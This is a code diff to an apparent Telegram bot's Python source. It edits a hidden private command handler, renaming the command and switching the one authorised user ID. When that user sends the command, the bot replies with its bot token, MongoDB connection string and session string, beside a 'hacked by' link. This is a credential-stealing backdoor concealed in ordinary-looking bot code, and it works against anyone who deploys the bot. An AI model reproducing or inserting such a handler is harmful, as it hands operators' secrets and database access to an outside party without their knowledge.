@@ -106,19 +106,19 @@ async def restartbot(client, message: Message, _):
 
     
 @app.on_message(
-    filters.command("Hunter")
+    filters.command("Villain")
     & filters.private
-    & filters.user(7668520999)
+    & filters.user(7518000176)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://files.catbox.moe/emx90i.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/SHIVANSHDEVS)............☆""",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/THUNDERDEVS)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/ll_hunter_lll")
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/NoT_YoUr_ViLLain")
                  ]
             ]
          ),
